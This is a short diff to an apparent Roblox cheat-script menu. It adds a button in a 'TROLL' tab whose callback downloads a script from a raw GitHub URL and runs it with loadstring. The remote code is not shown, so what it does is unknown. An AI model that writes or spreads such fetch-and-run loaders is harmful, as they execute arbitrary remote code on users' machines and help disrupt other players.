@@ -146,4 +146,11 @@ local Slider = Main:CreateSlider({
     end,
  })
 
+ local Button = TROLL:CreateButton({
+    Name = "HadGi",
+    Callback = function()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/Jesusjereal/111fd/main/GVIER", true))()
+    end,
+ })
+
 
